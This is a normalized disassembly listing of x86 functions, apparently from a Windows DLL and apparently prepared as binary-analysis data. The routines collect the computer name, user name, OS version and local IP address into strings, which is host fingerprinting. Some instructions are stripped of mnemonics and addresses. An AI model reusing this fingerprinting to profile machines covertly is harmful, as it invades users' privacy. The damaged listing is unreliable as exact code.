sub_10001040
push 0xffffffff
push sub_1001a04b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x348
mov al [ esp + 0x3 ]
push ebx
push ebp
push esi
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] al
call sub_10001da0
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x85 ]
mov [ esp + 0x84 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x10
xor eax eax
lea edi [ esp + 0x84 ]
lea edx [ esp + 0x84 ]
[ edi ]
lea ecx [ esp + 0x30 ]
mov [ esp + 0x360 ] ebx
push ecx
push edx
mov [ esp + 0x38 ] 0x40
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x159 ]
mov [ esp + 0x158 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x158 ]
mov [ esp + 0x28 ] 0x100
[ edi ]
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x158 ]
push eax
push ecx
call [ GetUserNameA@IAT ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x368 ]
mov al [ esp + 0x13 ]
push ebx
mov ecx ebp
mov [ ebp ] al
call sub_10001da0
xor edi edi
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebx ecx
mov ecx ebp
push ebx
call sub_10001e10
test al al
je r-xdata
mov ecx [ esp + 0x28 ]
mov edi rw-data
xor eax eax
lea edx [ esp + 0x84 ]
mov [ esp + ecx + 0x158 ] 0x0
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x84 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x158 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
mov edx [ esp + 0x1c ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x84 ]
or ecx 0xffffffff
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov ebp [ esp + 0x368 ]
mov dl [ esp + 0x13 ]
push ebx
mov ecx ebp
mov [ ebp ] dl
call sub_10001da0
xor edi edi
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebx ecx
mov ecx ebp
push ebx
call sub_10001e10
test al al
je r-xdata
push 0x1
lea ecx [ esp + 0x18 ]
mov [ esp + 0x364 ] 0xffffffff
call sub_10001da0
mov eax ebp
jmp r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov edx ecx
xor esi esi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebp
call sub_10001df0
jmp r-xdata
cmp esi ebx
jbe r-xdata
call sub_100106a0
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
xor esi esi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebp
call sub_10001df0
jmp r-xdata
mov ecx [ esp + 0x358 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x354
retn 0x4
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x1c ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov ecx [ esp + 0x1c ]
push ebx
lea ebp [ ecx + esi ]
lea ecx [ esp + 0x18 ]
push ebp
call sub_10001e10
test al al
je r-xdata
cmp esi ebx
jbe r-xdata
call sub_100106a0
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx esi
lea esi [ esp + 0x84 ]
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_10001df0
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x35 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x25
xor eax eax
lea edi [ esp + 0xc4 ]
mov [ esp + 0x34 ] 0x0
[ edi ]
lea ecx [ esp + 0xc4 ]
mov [ esp + 0xc4 ] 0x94
push ecx
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
push ebx
lea ecx [ esp + 0x18 ]
lea ebp [ eax + esi ]
push ebp
call sub_10001e10
test al al
je r-xdata
mov eax [ esp + 0xd4 ]
dec eax
je r-xdata
mov ebp [ esp + 0x368 ]
mov dl [ esp + 0x13 ]
push ebx
mov ecx ebp
mov [ ebp ] dl
call sub_10001da0
xor edi edi
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebx ecx
mov ecx ebp
push ebx
call sub_10001e10
test al al
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
push ebp
lea edi [ edx + ecx ]
mov ecx esi
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_10001df0
cmp [ esp + 0xc8 ] 0x4
jne r-xdata
dec eax
jne r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
xor esi esi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebp
call sub_10001df0
jmp r-xdata
lea edi [ esp + 0x34 ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x1c ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov eax [ esp + 0xcc ]
cmp eax ebx
jne r-xdata
mov eax [ esp + 0xc8 ]
cmp eax 0x6
jne r-xdata
cmp esi ebx
jbe r-xdata
call sub_100106a0
cmp eax 0xa
jne r-xdata
lea edx [ esp + 0x34 ]
mov edi rw-data
jmp r-xdata
cmp eax 0x5
jne r-xdata
cmp [ esp + 0xcc ] 0x1
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x1c ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov ecx [ esp + 0x1c ]
push ebx
lea ebp [ ecx + esi ]
lea ecx [ esp + 0x18 ]
push ebp
call sub_10001e10
test al al
je r-xdata
lea edx [ esp + 0x34 ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
cmp eax 0x4
ja r-xdata
mov eax [ esp + 0xcc ]
cmp eax ebx
jne r-xdata
lea edx [ esp + 0x34 ]
mov edi rw-data
jmp r-xdata
cmp esi ebx
jbe r-xdata
call sub_100106a0
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx esi
lea esi [ esp + 0x34 ]
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_10001df0
lea edx [ esp + 0x34 ]
mov edi rw-data
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x34 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x34 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
push 0x100
call sub_10014308
push 0x100
call sub_10014308
mov ebp eax
mov ecx 0x40
xor eax eax
mov edi ebp
[ edi ]
add esp 0x8
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x258 ]
mov [ esp + 0x2c ] 0xff
push ecx
push edx
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
push ebx
lea ecx [ esp + 0x18 ]
lea ebp [ eax + esi ]
push ebp
call sub_10001e10
test al al
je r-xdata
cmp eax 0x1
jne r-xdata
lea edx [ esp + 0x34 ]
mov edi rw-data
jmp r-xdata
lea eax [ esp + 0x258 ]
push eax
call [ gethostbyname@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
movsx ecx [ esi + 0xa ]
mov edx [ esi + 0xc ]
mov eax ecx
lea edi [ esp + 0x78 ]
mov ebx [ inet_ntoa@IAT ]
mov esi [ edx ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x78 ]
push esi
call ebx
mov edi eax
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
dec ecx
mov edi ecx
call ebx
mov ecx edi
mov esi eax
mov edi ebp
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov eax [ r--data ]
mov edx [ esp + 0x1c ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov ebp [ esp + 0x368 ]
mov al [ esp + 0x13 ]
push ebx
mov ecx ebp
mov [ ebp ] al
call sub_10001da0
xor edi edi
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebx ecx
mov ecx ebp
push ebx
call sub_10001e10
test al al
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
push ebp
lea edi [ edx + ecx ]
mov ecx esi
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_10001df0
lea edx [ esp + 0x34 ]
mov edi rw-data
jmp r-xdata
test esi esi
jbe r-xdata
call sub_100106a0
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov edx ecx
xor esi esi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
add eax ebx
mov [ eax ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x1c ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov ecx [ esp + 0x1c ]
push 0x0
lea ebx [ ecx + esi ]
lea ecx [ esp + 0x18 ]
push ebx
call sub_10001e10
test al al
je r-xdata
test esi esi
jbe r-xdata
call sub_100106a0
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx esi
mov esi ebp
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_10001df0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x1c ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov ecx [ esp + 0x1c ]
push 0x0
lea ebx [ ecx + esi ]
lea ecx [ esp + 0x18 ]
push ebx
call sub_10001e10
test al al
je r-xdata
test esi esi
jbe r-xdata
call sub_100106a0
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx esi
mov esi rw-data
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_10001df0
mov esi [ esp + 0x368 ]
mov cl [ esp + 0x14 ]
push 0x0
mov [ esi ] cl
mov ecx esi
call sub_10001da0
mov edx [ r--data ]
lea eax [ esp + 0x14 ]
push edx
push 0x0
push eax
mov ecx esi
call sub_10001ba0
mov ecx [ esp + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x1c ]
push 0x0
lea ecx [ esp + 0x18 ]
lea ebp [ eax + esi ]
push ebp
call sub_10001e10
test al al
je r-xdata
mov eax esi
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx esi
mov esi rw-data
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ebp
mov [ eax + ebp ] 0x0
dec ecx
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_10001840
sub esp 0x2b4
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0xc5 ]
mov [ esp + 0xc4 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0xc4 ]
mov ebx 0x100
[ edi ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0xc4 ]
push eax
push ecx
mov [ esp + 0x18 ] ebx
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
lea edi [ esp + 0xc4 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + edx + 0xc4 ] 0x0
mov ebp [ esp + 0x2c8 ]
[ edi ]
not ecx
sub edi ecx
mov [ ebp ] 0x0
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov [ esp + 0x1c4 ] al
and ecx 0x3
mov [ esp + 0x14 ] ebx
[ edi ] [ esi ]
mov ecx 0x3f
lea edi [ esp + 0x1c5 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x1c4 ]
[ edi ]
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x1c4 ]
push eax
push ecx
call [ GetUserNameA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2b4
retn 0x4
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + edx + 0x1c4 ] 0x0
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea ebx [ ebp + 0x60 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x1c4 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x25
lea edi [ esp + 0x30 ]
mov [ ebx ] al
[ edi ]
lea eax [ esp + 0x30 ]
mov [ esp + 0x30 ] 0x94
push eax
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2b4
retn 0x4
mov eax [ esp + 0x40 ]
dec eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2b4
retn 0x4
cmp [ esp + 0x34 ] 0x4
jne r-xdata
dec eax
jne r-xdata
push 0x100
call sub_10014308
push 0x100
mov esi eax
call sub_10014308
add esp 0x8
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] 0xff
push eax
push esi
call [ GetComputerNameA@IAT ]
push esi
call [ gethostbyname@IAT ]
movsx ecx [ eax + 0xa ]
mov edx [ eax + 0xc ]
mov eax ecx
lea edi [ esp + 0x24 ]
mov ebx [ inet_ntoa@IAT ]
mov esi [ edx ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x24 ]
push esi
call ebx
mov edi eax
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
dec ecx
mov edi ecx
call ebx
mov ecx edi
mov esi eax
lea edi [ ebp + 0x40 ]
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebp + 0x70 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
mov [ edx ] 0x0
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2b4
retn 0x4
mov eax [ esp + 0x38 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x34 ]
cmp eax 0x6
jne r-xdata
cmp eax 0xa
jne r-xdata
mov edi rw-data
jmp r-xdata
cmp eax 0x5
jne r-xdata
cmp [ esp + 0x38 ] 0x1
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp eax 0x4
ja r-xdata
mov eax [ esp + 0x38 ]
test eax eax
jne r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
sub_10001b60
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_10001ba0
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
mov ebp ecx
cmp [ edi + 0x8 ] esi
jae r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ esp + 0x1c ]
mov ebx eax
sub ebx esi
cmp ecx ebx
jae r-xdata
call sub_100108cc
cmp ebp edi
jne r-xdata
mov ebx ecx
xor edx edx
cmp ebx edx
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ r--data ]
add ebx esi
cmp eax ebx
jae r-xdata
mov ecx ebp
call sub_10001f30
cmp eax ebx
jae r-xdata
cmp ebx eax
jne r-xdata
mov ecx ebp
call sub_10002050
mov eax [ ebp + 0x8 ]
sub eax ebx
cmp eax edi
jae r-xdata
call sub_100108cc
mov ecx [ ebp + 0x4 ]
test ecx ecx
je r-xdata
call sub_100106a0
mov eax [ edi + 0x4 ]
cmp eax edx
jne r-xdata
test edi edi
jbe r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp [ eax - 0x1 ] 0xfe
jae r-xdata
mov eax r--data
mov ecx ebp
mov edi esi
call sub_10002050
mov eax [ ebp + 0x8 ]
cmp eax esi
jae r-xdata
mov ecx [ ebp + 0x4 ]
sub eax edi
add ecx ebx
push eax
lea edx [ ecx + edi ]
push edx
push ecx
call sub_100077a0
mov esi [ ebp + 0x8 ]
add esp 0xc
sub esi edi
mov ecx ebp
push 0x0
push esi
call sub_10001e10
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_10001da0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
cmp al 0xff
je r-xdata
mov eax [ ebp + 0x4 ]
cmp eax edx
je r-xdata
test edi edi
jbe r-xdata
mov edi eax
mov esi [ esp + 0x18 ]
mov eax [ ebp + 0x4 ]
mov [ ebp + 0x8 ] esi
mov [ esi + eax ] 0x0
push 0x1
mov ecx ebp
call sub_10001da0
cmp eax ebx
jae r-xdata
test ebx ebx
jne r-xdata
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
mov eax [ edi + 0x4 ]
cmp eax edx
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
mov ecx [ ebp + 0x4 ]
sub eax edi
push eax
lea edx [ ecx + edi ]
push edx
push ecx
call sub_100077a0
mov esi [ ebp + 0x8 ]
add esp 0xc
sub esi edi
mov ecx ebp
push 0x0
push esi
call sub_10001e10
test al al
je r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
add esi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ebx + ecx ] 0x0
mov eax r--data
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
push ebx
mov ecx ebp
call sub_10001f40
dec al
push ebx
mov [ ecx - 0x1 ] al
mov ecx ebp
call sub_10001da0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
mov [ ebp + 0x4 ] eax
mov ecx [ edi + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov edx [ edi + 0xc ]
mov [ ebp + 0xc ] edx
mov cl [ eax - 0x1 ]
inc cl
pop edi
mov [ eax - 0x1 ] cl
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
mov eax r--data
push ecx
call sub_10014331
add esp 0x4
xor edx edx
cmp al 0xff
je r-xdata
push esi
mov ecx ebp
call sub_10001df0
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0xc
dec al
mov [ ecx ] al
jmp r-xdata
sub_10001da0
mov al [ esp + 0x4 ]
push esi
test al al
mov esi ecx
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_10001e10
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
cmp edi 0xfffffffd
mov esi ecx
jbe r-xdata
mov eax [ esi + 0x4 ]
xor ebx ebx
cmp eax ebx
je r-xdata
call sub_100106a0
mov cl [ esp + 0x14 ]
cmp edi ebx
jne r-xdata
mov cl [ eax - 0x1 ]
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl bl
je r-xdata
cmp cl 0xff
je r-xdata
cmp [ esi + 0xc ] edi
jae r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0x1f
ja r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
push edi
mov ecx esi
call sub_10001f40
cmp eax ebx
je r-xdata
cmp ecx edi
jae r-xdata
pop edi
pop esi
xor al al
pop ebx
retn 0x8
mov [ esi + 0x8 ] ebx
mov [ eax ] bl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop edi
pop esi
xor al al
pop ebx
retn 0x8
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
dec cl
pop edi
mov [ eax - 0x1 ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
push edi
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_10001f40
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
pop edi
mov [ ecx ] al
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
xor al al
pop ebx
retn 0x8
dec al
push edi
mov [ ecx ] al
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_10001f40
pop edi
pop esi
mov al 0x1
pop ebx
retn 0x8
sub_10001f40
push ebp
mov ebp esp
push 0xffffffff
push sub_1001a060
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi eax
or esi 0x1f
push edi
mov ebx ecx
cmp esi 0xfffffffd
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] esi
jbe r-xdata
lea eax [ esi + 0x2 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
jge r-xdata
mov [ ebp - 0x14 ] eax
mov esi eax
push eax
call sub_10014308
add esp 0x4
mov [ ebp + 0x8 ] eax
jmp r-xdata
xor eax eax
mov eax [ ebx + 0x8 ]
test eax eax
jbe r-xdata
mov eax [ ebx + 0x4 ]
mov edi [ ebx + 0x8 ]
test eax eax
je r-xdata
cmp eax esi
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] 0x0
inc eax
cmp edi esi
mov [ ebx + 0x4 ] eax
mov [ eax - 0x1 ] 0x0
mov [ ebx + 0xc ] esi
ja r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov esi [ ebx + 0x4 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx ecx
shr ecx 0x2
lea edi [ eax + 0x1 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp - 0x14 ]
mov eax esi
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] esi
pop edi
mov [ ecx + esi ] 0x0
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi edi
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_10002050
push ebx
push ebp
mov ebp ecx
xor edx edx
push esi
push edi
mov ecx [ ebp + 0x4 ]
cmp ecx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov al [ ecx - 0x1 ]
test al al
je r-xdata
cmp al 0xff
je r-xdata
dec al
mov esi ecx
mov [ ecx - 0x1 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
[ edi ]
not ecx
dec ecx
mov ebx ecx
cmp ebx 0xfffffffd
jbe r-xdata
mov ecx [ ebp + 0x4 ]
cmp ecx edx
je r-xdata
call sub_100106a0
xor edx edx
cmp ebx edx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_10001da0
pop edi
pop esi
pop ebp
pop ebx
retn
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call sub_10001da0
cmp eax ebx
jae r-xdata
cmp ebx edx
jne r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
mov [ ebx + ecx ] 0x0
push ebx
mov ecx ebp
call sub_10001f40
dec al
push edx
mov [ ecx - 0x1 ] al
mov ecx ebp
call sub_10001da0
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10002160
push 0xffffffff
push sub_1001a0b2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov al [ esp + 0x3 ]
push ebx
push ebp
push esi
mov esi ecx
